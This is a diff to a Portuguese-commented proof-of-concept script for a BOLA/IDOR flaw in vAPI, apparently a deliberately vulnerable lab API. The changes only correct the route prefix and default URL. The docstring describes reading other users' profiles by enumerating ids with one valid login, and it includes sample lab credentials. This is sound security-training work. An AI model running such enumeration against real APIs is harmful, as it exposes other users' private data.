@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 PoC - Vulnerabilidade 1: Broken Object Level Authorization (API1:2023)
-Endpoint: GET /api/api1/user/{id}
+Endpoint: GET /vapi/api1/user/{id}
 Alvo: vAPI (https://github.com/roottusk/vapi)
 
 A API apenas confirma que o par usuario:senha enviado no header
@@ -14,7 +14,7 @@ ids, provando que e possivel ler perfis de outros usuarios (BOLA/IDOR).
 
 Uso:
     pip install requests
-    python3 poc_bola_get_user.py --url http://localhost/api \\
+    python3 poc_bola_get_user.py --url http://localhost:8000/vapi \\
         --username jimhalp --password 'ag4|YY~`M=Gk' --range 1 10
 """
 import argparse
@@ -65,7 +65,7 @@ def exploit(base_url: str, username: str, password: str, id_start: int, id_end: 
 
 def main():
     parser = argparse.ArgumentParser(description="PoC BOLA - GET /api1/user/{id} (vAPI)")
-    parser.add_argument("--url", default="http://localhost/api", help="Base URL da API (ex: http://localhost/api)")
+    parser.add_argument("--url", default="http://localhost:8000/vapi", help="Base URL da API, SEM o endpoint (ex: http://localhost:8000/vapi). O prefixo real de rotas do vAPI e /vapi, nao /api -- confira com 'php artisan route:list' dentro do container se tiver duvida.")
     parser.add_argument("--username", required=True, help="Usuario valido qualquer (ex: jimhalp)")
     parser.add_argument("--password", required=True, help="Senha desse usuario")
     parser.add_argument("--range", nargs=2, type=int, default=[1, 10], metavar=("INICIO", "FIM"))
